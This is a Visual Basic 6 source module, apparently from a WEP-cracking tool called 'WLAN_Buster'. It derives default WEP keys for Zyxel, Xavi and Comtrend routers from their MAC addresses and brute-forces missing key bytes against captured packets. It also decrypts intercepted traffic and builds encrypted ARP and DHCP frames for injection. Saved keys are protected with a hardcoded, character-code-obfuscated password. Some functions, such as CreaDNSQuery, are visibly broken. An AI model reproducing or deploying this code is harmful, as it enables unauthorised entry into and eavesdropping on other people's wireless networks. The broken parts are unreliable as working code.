Attribute VB_Name = "Module1"
Public Const Version = "201"
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As Any, ByVal lpWindowName As Any) As Long
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function ShowWindow Lib "user32.dll" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Boolean
Public Declare Function GetTickCount Lib "kernel32" () As Long
Public Declare Function CloseWindow Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function DestroyWindow Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function gethostname Lib "wsock32.dll" (ByVal szHost As String, ByVal dwHostLen As Long) As Long
Private Declare Function WLB_RC4 Lib "C:\DATOS\desarrollo\WLBCrypto\Debug\wlbcrypto.dll" (ByVal data As String, DataLen As Long, ByVal Key As String, KeyLen As Long) As Long
Private Declare Function WLB_CRC32 Lib "C:\DATOS\desarrollo\WLBCrypto\Debug\wlbcrypto.dll" (ByVal data As String, DataLen As Long, ByVal crc As String) As Long

Public Const WM_QUIT = &H12
Public Const FHDR = "WLB_PCK-->"
Public hfg As Integer
Public Const WebServer = "www.aiasec.net"
Public PCName As String
Public Const RojoClaro = &HC0&
Public Const Rojo = &H80&
Public Const Naranja = &H80FF&
Public Const RojoOscuro = &H40&
Public Const Verde = &H8000&
Public gESSID As String
Public gBSSID As String
Public gCANAL As Integer
Public gMACLocal As String
Public RelBSSIDs As String



Private hfCap As Integer
Public Sub RefrescaRelBSSIDs()
   RelBSSIDs = "|" & GetSetting("WLAN_Buster", "BSSIDS", "List", "")
End Sub

Public Function GetMachineName() As String

   Dim sHostName As String * 256
   
   On Error Resume Next
   If gethostname(sHostName, 256) = ERROR_SUCCESS Then
      GetMachineName = Left$(sHostName, InStr(sHostName, Chr$(0)) - 1)
   End If
  
End Function
Public Function AbrirCAP(ByVal Nombre As String)
   Const GenHDR = "D4C3B2A1020004000000000000000000FFFF000069000000"
   Close hfCap
   hfCap = FreeFile
   Open Nombre & ".cap" For Binary Access Read Write As #hfCap
   Put #hfCap, , HexaASCII(GenHDR)
End Function
Public Sub EscribeCAP(ByVal Paquete As String)
   Dim PacHDR As String
   Dim lp As String
   Dim lc As String
   Dim b1 As Byte
   Dim b2 As Byte
   PacHDR = "00000000" & "00000000"
   lp = Len(Paquete)
   b1 = lp Mod 256
   b2 = lp \ 256
   PacHDR = PacHDR & DecHex(b1) & DecHex(b2) & "0000" & DecHex(b1) & DecHex(b2) & "0000"
   Put #hfCap, , HexaASCII(PacHDR) & Paquete
End Sub


Public Sub GrabaPaquete(ByVal bssid As String, ByVal clave As String, ByVal Paquete As String, ByVal fichero As String)
    Dim pt As String
    Dim f As Integer
    Dim l As Long
    Dim b1 As Byte
    Dim b2 As Byte
    'DESACTIVADO EN VERSION 2.0
    Exit Sub
    '**************************
    If hfg = 0 Then
       hfg = FreeFile
       Open fichero For Binary Access Read Write As #hfg
    End If
    l = Len(Paquete)
    b1 = l \ 256
    b2 = l Mod 256
    pt = FHDR
    pt = pt & bssid & Right$("?????????????" & clave, 13) & Chr$(b1) & Chr$(b2)
    pt = pt & Paquete
    Put #hfg, , pt
End Sub
Public Sub Espera(ByVal milis As Long)
   Dim T As Long
   T = GetTickCount()
   Do While (GetTickCount() - T) < milis
      DoEvents
   Loop
End Sub
Public Sub GuardaBSSID(ByVal bssid As String)
   Dim a As String
   a = GetSetting("WLAN_Buster", "BSSIDS", "List", "")
   If InStr(a, bssid) = 0 Then
      a = a & bssid & "|"
   End If
   SaveSetting "WLAN_Buster", "BSSIDS", "List", a
End Sub
Public Function ListaBSSIDS() As String
   Dim b() As String
   Dim a As String
   Dim n As Integer
   Dim c As String
   a = GetSetting("WLAN_Buster", "BSSIDS", "List", "")
   b = Split(a, "|")
   For n = 0 To UBound(b) - 1
       If LeeClave(b(n)) > "" Then 'Existe y no se ha tocado su hash
          c = c & b(n) & "|"
       End If
   Next n
   ListaBSSIDS = c
End Function
Public Sub CargaListaBSSIDs(lst As ListBox)
   Dim a As String
   Dim b() As String
   Dim n As Integer
   a = ListaBSSIDS()
   b = Split(a, "|")
   For n = 0 To UBound(b) - 1
       lst.AddItem b(n)
   Next n
End Sub
Public Function LeeClave(ByVal bssid As String) As String
   Dim dummy1 As String
   Dim dummy2 As String
   LeeClave = GetSetting("WLAN_Buster", "BSSID", bssid, "")
   If Not CompruebaClaveEnvio(LeeClave, dummy1, dummy2) Then LeeClave = ""
End Function
Public Function LeeWEP(ByVal bssid As String) As String
   LeeWEP = GetSetting("WLAN_Buster", "WEP", bssid, "")
End Function
Public Sub EscribeClave(ByVal bssid As String, ByVal clave As String)
   SaveSetting "WLAN_Buster", "BSSID", bssid, GeneraClaveEnvio(bssid, clave)
   GuardaBSSID bssid
   RefrescaRelBSSIDs
End Sub
Public Sub EscribeWEP(ByVal bssid As String, ByVal WEP As String)
   SaveSetting "WLAN_Buster", "WEP", bssid, WEP
End Sub

Public Function GeneraClaveEnvio(ByVal bssid As String, ByVal clave As String) As String
   Dim a As String
   Dim c As String
   Dim cl As String
   Dim s As String
   s = Chr$(Int(Rnd * 256)) & Chr$(Int(Rnd * 256)) & Chr$(Int(Rnd * 256)) & Chr$(0)
   cl = Chr$(66) & Chr$(117) & Chr$(116) & Chr$(116) & Chr$(101) & Chr$(114) & Chr$(70) & Chr$(108) & Chr$(121)
   c = CRC32(bssid & clave)
   a = RC4(bssid & clave & c, s & cl)
   GeneraClaveEnvio = ASCIIHexa(s) & ASCIIHexa(a)
End Function
Public Function CompruebaClaveEnvio(ByVal ClaveEnvio As String, ByRef bssid As String, ByRef clave As String) As Boolean
   Dim a As String
   Dim a2 As String
   Dim cl As String
   Dim c As String
   Dim s As String
   cl = Chr$(66) & Chr$(117) & Chr$(116) & Chr$(116) & Chr$(101) & Chr$(114) & Chr$(70) & Chr$(108) & Chr$(121)
   a = HexaASCII(ClaveEnvio)
   s = Left$(a, 4)
   a = Mid$(a, 5)
   a2 = RC4(a, s & cl)
   c = Right$(a2, 8)
   a2 = Left$(a2, Len(a2) - 8)
   bssid = Left$(a2, 17)
   clave = Right$(a2, 13)
   If CRC32(bssid & clave) = c Then CompruebaClaveEnvio = True
End Function

Public Function RC4Bup(ByVal Expression As String, ByVal Password As String) As String
    On Error Resume Next
    Dim RB(0 To 255) As Integer, X As Long, Y As Long, Z As Long, Key() As Byte, ByteArray() As Byte, Temp As Byte
    If Len(Password) = 0 Then
        Exit Function
    End If
    If Len(Expression) = 0 Then
        Exit Function
    End If
    If Len(Password) > 256 Then
        Key() = StrConv(Left$(Password, 256), vbFromUnicode)
    Else
        Key() = StrConv(Password, vbFromUnicode)
    End If
    For X = 0 To 255
        RB(X) = X
    Next X
    X = 0
    Y = 0
    Z = 0
    For X = 0 To 255
        Y = (Y + RB(X) + Key(X Mod Len(Password))) Mod 256
        Temp = RB(X)
        RB(X) = RB(Y)
        RB(Y) = Temp
    Next X
    X = 0
    Y = 0
    Z = 0
    ByteArray() = StrConv(Expression, vbFromUnicode)
    For X = 0 To Len(Expression)
        Y = (Y + 1) Mod 256
        Z = (Z + RB(Y)) Mod 256
        Temp = RB(Y)
        RB(Y) = RB(Z)
        RB(Z) = Temp
        ByteArray(X) = ByteArray(X) Xor (RB((RB(Y) + RB(Z)) Mod 256))
    Next X
    RC4Bup = StrConv(ByteArray, vbUnicode)
End Function
Public Function RC4(ByVal Expression As String, ByVal Password As String) As String
    Dim a As String
    Dim ret As Long
    a = Expression
    ret = WLB_RC4(a, Len(a), Password, Len(Password))
    RC4 = a
  
  'RC4 = RC4Bup(Expression, Password)
End Function
Public Function CRC32Bup(ByVal s As String) As String
   ' Initializes CRC, updates CRC for each char in S, and finishes
   ' off at the end.
   ' Examining this function, and "CRCUpdate", should make it obvious
   ' how to do a CRC of a large binary file.
   ' 32 bit Returns zero for zero length string (probably why the CRC is
   ' complimented at the end.)
   Dim l As Long
   Dim LCRC As Long
   Dim ICRC As Integer
   
         ' Initialise: this is part of the CRC32 protocol.
         LCRC = &HFFFFFFFF
         
         ' Update for each byte in S
         For l = 1 To Len(s): CRCUpdate LCRC, Asc(Mid$(s, l)): Next
         
         ' Finally flip all bits, again, just part of the prorocol.
         LCRC = Not LCRC
         
         ' Format the long CRC value as a hex string.
         ' Insert leading zeros if required.
         CRC32Bup = Hex$(LCRC): Do While Len(CRC32Bup) < 8: CRC32Bup = "0" & CRC32Bup: Loop
End Function
Public Function CRC32(ByVal s As String) As String
    Dim crc As String
    Dim ret As Long
    Dim n As Integer
    crc = Space$(4)
    ret = WLB_CRC32(s, Len(s), crc)
    CRC32 = DecHex(Asc(Mid$(crc, 4, 1))) & DecHex(Asc(Mid$(crc, 3, 1))) & DecHex(Asc(Mid$(crc, 2, 1))) & DecHex(Asc(Mid$(crc, 1, 1)))
'    If CRC32 <> CRC32Bup(s) Then
'       kk = True
'    End If
End Function
Private Sub CRCUpdate(ByRef crc, ByVal b As Byte)
   ' Note no type declaration for CRC, as a long or integer can be passed.
   Const Polynomial16 As Integer = &HA001
   Const Polynomial32 As Long = &HEDB88320
   Dim Bits As Byte
   
   crc = crc Xor b
   For Bits = 0 To 7
      Select Case (crc And &H1) ' test LSB
            Case 0
               ' LSB zero, just shift.
               crc = rightShift(crc)
            Case Else
               ' only xor with polynomial if lsb set.
               Select Case VarType(crc)
                  Case vbLong
                     crc = rightShift(crc) Xor Polynomial32
                  Case Else
                     crc = rightShift(crc) Xor Polynomial16
               End Select
      End Select
   Next
End Sub

Private Function rightShift(ByVal v) As Long
   ' Note no type declaration for V, as a long or integer can be passed.
   ' Self-explanatory. The final line is essential (maybe
   ' not obvious) because the number is signed.
   Select Case VarType(v)
      Case vbLong
         rightShift = v And &HFFFFFFFE
         rightShift = rightShift \ &H2
         rightShift = rightShift And &H7FFFFFFF
      Case Else
         rightShift = v And &HFFFE
         rightShift = rightShift \ &H2
         rightShift = rightShift And &H7FFF
   End Select
End Function
Public Function HexDec(ByVal h As String) As Byte
   Const le = "0123456789ABCDEF"
   h = UCase$(h)
   HexDec = 16 * (InStr(le, Mid$(h, 1, 1)) - 1)
   HexDec = HexDec + (InStr(le, Mid$(h, 2, 1)) - 1)
End Function

Public Function DecHex(ByVal d As Byte) As String
   DecHex = UCase$(Right$("0" & Hex$(d), 2))
End Function
Public Function HexaASCII(ByVal strh As String) As String
   Dim n As Long
   For n = 1 To Len(strh) - 1 Step 2
       HexaASCII = HexaASCII & Chr$(HexDec(Mid$(strh, n, 2)))
   Next n
End Function
Public Function ASCIIHexa(ByVal stra As String) As String
   Dim n As Long
   For n = 1 To Len(stra)
       ASCIIHexa = ASCIIHexa & DecHex(Asc(Mid$(stra, n, 1)))
   Next n
End Function
Public Function ASCIIHexa2(ByVal stra As String) As String
   Dim n As Long
   For n = 1 To Len(stra)
       ASCIIHexa2 = ASCIIHexa2 & DecHex(Asc(Mid$(stra, n, 1))) & ":"
   Next n
   ASCIIHexa2 = Left$(ASCIIHexa2, Len(ASCIIHexa2) - 1)
End Function
Public Function XORCads(ByVal C1 As String, ByVal C2 As String) As String
   Dim n As Long
   Dim i As Integer
   For n = 1 To Len(C1)
       i = i + 1
       If i = 4 Then i = 1
       XORCads = XORCads & Chr$(Asc(Mid$(C1, n, 1)) Xor Asc(Mid$(C2, i, 1)))
   Next n
End Function
Public Function ClaveValida(ByVal PaqueteCompleto As String, ByVal clave As String) As Boolean
   Dim iv As String
   Dim Paquete As String
   Dim ks As String
   Dim icva As String
   Dim xc As String
   'Paquetecompleto=IV + Datos + ICV
   iv = Left$(PaqueteCompleto, 3)
   Paquete = Mid$(PaqueteCompleto, 5)
   ks = RC4(Paquete, iv & clave)
   icva = CRC32(Left$(ks, Len(ks) - 4))
   
   icva = Mid$(icva, 7, 2) & Mid$(icva, 5, 2) & Mid$(icva, 3, 2) & Mid$(icva, 1, 2)
   If icva = ASCIIHexa(Right$(ks, 4)) Then
      ClaveValida = True
   Else
      ClaveValida = False
   End If
End Function
Public Function IPs(ByVal PaqueteCompleto As String, ByVal clave As String) As String
   Dim iv As String
   Dim Paquete As String
   Dim ks As String
   Dim icva As String
   Dim xc As String
   iv = Left$(PaqueteCompleto, 3)
   Paquete = Mid$(PaqueteCompleto, 5)
   ks = RC4(Paquete, iv & clave)
   icva = CRC32(Left$(ks, Len(ks) - 4))
   
   icva = Mid$(icva, 7, 2) & Mid$(icva, 5, 2) & Mid$(icva, 3, 2) & Mid$(icva, 1, 2)
   If icva = ASCIIHexa(Right$(ks, 4)) Then
      IPs = ip(Mid$(ks, 21, 4))
      IPs = IPs & " ----> " & ip(Mid$(ks, 25, 4))
   Else
      IPs = "?"
   End If
End Function
Public Function Desencripta(ByVal PaqueteCompleto As String, ByVal clave As String) As String
   Dim iv As String
   Dim Paquete As String
   Dim ks As String
   Dim icva As String
   Dim xc As String
   If PaqueteCompleto = "" Then Exit Function
   iv = Left$(PaqueteCompleto, 3)
   Paquete = Mid$(PaqueteCompleto, 5)
   ks = RC4(Paquete, iv & clave)
   icva = CRC32(Left$(ks, Len(ks) - 4))
   
   icva = Mid$(icva, 7, 2) & Mid$(icva, 5, 2) & Mid$(icva, 3, 2) & Mid$(icva, 1, 2)
   If icva = ASCIIHexa(Right$(ks, 4)) Then
      Desencripta = ks
   Else
      Desencripta = "?"
   End If
End Function

Public Function MAC(ByVal a As String) As String
   MAC = Right$("0" & Hex$(Asc(Mid$(a, 1, 1))), 2) & ":"
   MAC = MAC & Right$("0" & Hex$(Asc(Mid$(a, 2, 1))), 2) & ":"
   MAC = MAC & Right$("0" & Hex$(Asc(Mid$(a, 3, 1))), 2) & ":"
   MAC = MAC & Right$("0" & Hex$(Asc(Mid$(a, 4, 1))), 2) & ":"
   MAC = MAC & Right$("0" & Hex$(Asc(Mid$(a, 5, 1))), 2) & ":"
   MAC = MAC & Right$("0" & Hex$(Asc(Mid$(a, 6, 1))), 2)
End Function
Public Function ip(ByVal a As String) As String
   On Error Resume Next
   ip = Asc(Mid$(a, 1, 1)) & "."
   ip = ip & Asc(Mid$(a, 2, 1)) & "."
   ip = ip & Asc(Mid$(a, 3, 1)) & "."
   ip = ip & Asc(Mid$(a, 4, 1))
End Function
Public Function TestsWEP()
   Const encr = "AD036EB74A8485B4F466B3B5FA7FE1FB6068A744D1E6008C418403FD7134139CF58A6274CF9723CD257B4F13A837D6ACE57D00023F00"
   Const iv = "832405"
   Const ICV = "83BCBE88"
   Dim ead As String
   Dim eaiv As String
   Dim ks As String
   Dim xc As String
   Dim icva As String
   
'   ead = HexaASCII(encr)
'   eaiv = HexaASCII(IV)
'   ks = RC4(eaiv, "X000138A1A31F")
'   xc = XORCads(ead, ks)
'   icva = CRC32(xc)
   
   
   ead = HexaASCII(encr & ICV)
   eaiv = HexaASCII(iv)
   ks = RC4(ead, eaiv & "X000138A1A31F")
   xc = ASCIIHexa(ks)
   icva = CRC32(Left$(ks, Len(ks) - 4))
   
   icva = Mid$(icva, 7, 2) & Mid$(icva, 5, 2) & Mid$(icva, 3, 2) & Mid$(icva, 1, 2)
   If icva = Right$(xc, 8) Then
      kk = True
   Else
      kk = True
   End If
End Function

Public Function Tests2()
   Const P = "084ADA00001185C5322C000138A25D1D000138A1A31FE0B6E42F05007BEEB186A93CCB13AD902D2DED9F5DCF1FE8C56E2883A1980B670642E14D80F6B5DB4C70A910BECA0DE51E9FEDC5AD8AA686B33698893B8700CB8544C90EA14432D382E5A2591D95F00474D19DD92F556A97F630522D765A5EDB26D414352E26FC659A6F20039B29CE17A97DDE51662BE007422EF49CFFBA8154C8AFA42EE0C39F28462A76FFE35815B8BFED2AAE"
   Dim n As Integer
   Dim pa As String
   pa = HexaASCII(P)
   pa = Mid$(pa, 25)
   MsgBox GuessClave(pa, "X000138____1F")
   If ClaveValida(pa, "X000138A1A31F") Then
      MsgBox "Válida"
   End If
   
End Function
Public Function GuessClave(ByVal Paquete As String, ByVal Raiz As String) As String
   Dim k As String
   Dim i1 As Integer
   Dim i2 As Integer
   For i1 = 0 To 255
       For i2 = 0 To 255
           k = Left$(Raiz, 7) & DecHex(i1) & DecHex(i2) & Right$(Raiz, 2)
           If ClaveValida(Paquete, k) Then
              GuessClave = k
              Exit Function
           End If
       Next i2
   Next i1
End Function
Public Function CreaARPRequestEth(ByVal smac As String, ByVal sIP As String, ByVal dIP As String) As String
    'ARP Eth
    'HARDWARE:                  00 01
    'PROTOCOL (IP)              08 00
    'HARDWARE ADDRESS LENGTH:   06
    'PROTOCOL ADDRESS LENGTH:   04
    'OPERATION 1 (ARP REQUEST)  00 01
    'SENDER MAC:                s1 s2 s3 s4 s5 s6
    'SENDER IP:                 i1 i2 i3 i4
    'TARGET MAC:                00 00 00 00 00 00
    'TARGET IP:                 i1 i2 i3 i4
   
   smac = Replace(smac, ":", "")
   sIP = IPHex(sIP)
   dIP = IPHex(dIP)
   CreaARPRequestEth = "0001080006040001" & smac & sIP & "000000000000" & dIP
End Function
Public Function CreaARPRequest802(ByVal bssid As String, ByVal smac As String, ByVal dmac As String, ByVal sIP As String, ByVal dIP As String, ByVal clave As String) As String
    '802.11
    'FRAME CONTROL:         08 4A
    'DURATION:              30 00
    'DESTINATION ADDRESS:   00 80 5A 32 DC 6E
    'BSSID MAC:             00 16 38 EA 50 0E
    'SOURCE ADDRESS:        00 30 DA C1 A1 C2
    'SEQUENCE Number:       F0 31             <-----  C U I D A D O!!!!!!
    
    '802.LLC
    'DSAP                   AA
    'SSAP                   AA
    'COMMAND:               03
    '??????                 00 00 00
    'PROTOCOL (ARP)         08 06
    Const c802_LLC = "AAAA030000000806"
    smac = Replace(smac, ":", "")
    dmac = Replace(dmac, ":", "")
    bssid = Replace(bssid, ":", "")
    Debug.Print "08413000" & bssid & smac & dmac & "F031" & " - " & c802_LLC & CreaARPRequestEth(smac, sIP, dIP)
    CreaARPRequest802 = HexaASCII("08413000" & bssid & smac & dmac & "F031") & CreaPaqueteWEP(HexaASCII(c802_LLC & CreaARPRequestEth(smac, sIP, dIP)), clave)
End Function
Public Function CreaBootPC(ByVal Retry As Boolean, ByVal smac As String, ByVal bssid As String, ByVal clave As String) As String
    Dim pak As String
    Dim pak1 As String
    Dim hdrp As String
    Dim iv As String
    Dim GpAK As String
    smac = Replace(smac, ":", "")
    bssid = Replace(bssid, ":", "")
    hdrp = "08" & IIf(Retry, "49", "41") & "3000"
    hdrp = hdrp & bssid
    hdrp = hdrp & smac
    hdrp = hdrp & "FFFFFFFFFFFF"
    hdrp = hdrp & "101D"
    
    pak1 = "AAAA0300"
    pak1 = pak1 & "000008004500014856C400008011"
    pak1 = pak1 & "E2E100000000FFFFFFFF004400430134"
''''ch
    pak = pak & "0101060014F616AD0000000000000000000000000000"
    pak = pak & "000000000000"
    pak = pak & smac
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000638253633501017401013D0701"
    pak = pak & smac
    pak = pak & "0C066363636363633C084D53465420352E3037"
    pak = pak & "0B010F03062C2E2F1F21F92BFF00000000000000"
    pak = pak & "000000000000"
    GpAK = pak1
    GpAK = GpAK & ASCIIHexa(ChecksumUDP(HexaASCII("0044"), HexaASCII("0043"), HexaASCII("00000000"), HexaASCII("FFFFFFFF"), HexaASCII(pak)))
    GpAK = GpAK & pak
    CreaBootPC = HexaASCII(hdrp) & CreaPaqueteWEP(HexaASCII(GpAK), clave)
End Function
Public Function CreaPaqueteWEP(ByVal Payload As String, ByVal clave As String) As String
    'Payload  NO se recibe en hexadecimal
    Dim ks As String
    Dim iv As String
    ks = Payload
    ks = ks & StrReverse(HexaASCII(CRC32(ks)))
    iv = HexaASCII(GeneraIV())
    ks = RC4(ks, iv & clave)
    CreaPaqueteWEP = iv & Chr$(0) & ks
End Function
Public Function GeneraIV() As String
   GeneraIV = DecHex(Int(Rnd * 256)) & DecHex(Int(Rnd * 256)) & DecHex(Int(Rnd * 256))
End Function
Public Function IPHex(ByVal ip As String) As String
   Dim a() As String
   a = Split(ip, ".")
   IPHex = DecHex(Val(a(0))) & DecHex(Val(a(1))) & DecHex(Val(a(2))) & DecHex(Val(a(3)))
End Function

Public Function ChecksumUDP(ByVal sPort As String, ByVal dPort As String, ByVal sIP As String, ByVal dIP As String, ByVal data As String) As String
   Dim dl As Long
   Dim suma As Long
   Dim crr As Long
   Dim b1 As Long
   Dim b2 As Long
   'TEST FUNCTION
   'Data = HexaASCII("8044291000010000000000012045494641464145424647444844414441444143414341434143414341434143410000200001C00C00200001000493E000066000C0A80124")
   'sIP = HexaASCII("C0A80124")
   'dIP = HexaASCII("C0A801FF")
   'sPort = HexaASCII("0089")
   'dPort = HexaASCII("0089")
   'CHECKSUM 102E
   'Data = HexaASCII("01010600EBF5A7DB00000000000000000000000000000000000000000020A660916F00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000638253633501033D07010020A660916F3204C0A801240C09485050415637303030510D0000004850504156373030302E3C084D53465420352E30370B010F03062C2E2F1F21F92BFF")
   'sIP = HexaASCII("00000000")
   'dIP = HexaASCII("FFFFFFFF")
   'sPort = HexaASCII("0044")
   'dPort = HexaASCII("0043")
   'CHECKSUM 491E
   
   
   dl = Len(data) + 8
   If dl Mod 2 = 1 Then data = data & Chr$(0)
   data = sIP & dIP & HexaASCII("0011") & HexaASCII(Right$("0000" & Hex(dl), 4)) & sPort & dPort & HexaASCII(Right$("0000" & Hex(dl), 4)) & HexaASCII("0000") & data
   For n = 1 To Len(data) - 1 Step 2
       b1 = Asc(Mid$(data, n, 1))
       b1 = b1 * 256
       b2 = Asc(Mid$(data, n + 1, 1))
       suma = suma + b1 + b2
   Next n
   'suma = suma + 17 + dl
   crr = suma \ 65536
   suma = (suma Mod 65536) + crr
   'suma = Not suma
   ChecksumUDP = HexaASCII(Right$(Hex((Not suma)), 4))
End Function
Public Function clave(ByVal MAC As String) As String
   Dim c As String
   Select Case Left$(MAC, 8)
      Case "00:13:49" 'Zyxel
          c = "Z"
          clave = c & Replace(MAC, ":", "")
      Case "00:01:38" 'Xavi Technologies
          c = "X"
          clave = c & Replace(MAC, ":", "")
      Case "00:30:DA" 'Comtrend
          c = "C"
          clave = c & Replace(MAC, ":", "")
      Case "00:16:38" '3com?
          c = "C"
          clave = c & "0030DA" & Mid$(Replace(MAC, ":", ""), 7)
      Case Else 'Desconocido
          c = "Z"
          clave = c & Replace(MAC, ":", "")
   End Select
End Function
Public Function clave2(ByVal MAC As String, ByVal ESSID As String) As String
   Dim c As String
   c = clave(MAC)
   Mid$(c, Len(c) - 1, 2) = Right$(ESSID, 2)
   clave2 = c
End Function
Public Function CreaDNSQuery(ByVal smac As String, ByVal bssid As String, ByVal smac As String, ByVal sIP As String, ByVal DNS As String, ByVal host As String, ByVal clave As String) As String
    Dim pak As String
    Dim pak1 As String
    Dim hdrp As String
    Dim iv As String
    Dim GpAK As String
    smac = Replace(smac, ":", "")
    dmac = Replace(smac, ":", "")
    bssid = Replace(bssid, ":", "")
    hdrp = "0841" & "2C00"
    hdrp = hdrp & bssid
    hdrp = hdrp & smac
    hdrp = hdrp & dmac
    hdrp = hdrp & "F00C" '< ---Sequence
    
    pak1 = "AAAA0300"
    pak1 = pak1 & "000008004500"
    pak1 = pak1 & "00" & DecHex(46 + Len(host))
    pak1 = pak1 & "7473" '<----Id
    pak1 = pak1 & "00008011" '<----Id
    
    pak = pak & sIP & DNS & "0455" & "0035"
    pak = pak & "000000000000"
    pak = pak & smac
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000000000000000000000000000000000000000"
    pak = pak & "0000638253633501017401013D0701"
    pak = pak & smac
    pak = pak & "0C066363636363633C084D53465420352E3037"
    pak = pak & "0B010F03062C2E2F1F21F92BFF00000000000000"
    pak = pak & "000000000000"
    GpAK = pak1
    GpAK = GpAK & ASCIIHexa(ChecksumUDP(HexaASCII("0455"), HexaASCII("0035"), sIP, DNS, HexaASCII(pak)))
    GpAK = GpAK & pak
    CreaBootPC = HexaASCII(hdrp) & CreaPaqueteWEP(HexaASCII(GpAK), clave)
End Function
Public Function WHexa(ByVal d As Long) As String
     WHexa = Right$("0000" & Hex$(d), 4)
End Function
Public Function BHexa(ByVal d As Byte) As String
     BHexa = Right$("00" & Hex$(d), 2)
End Function

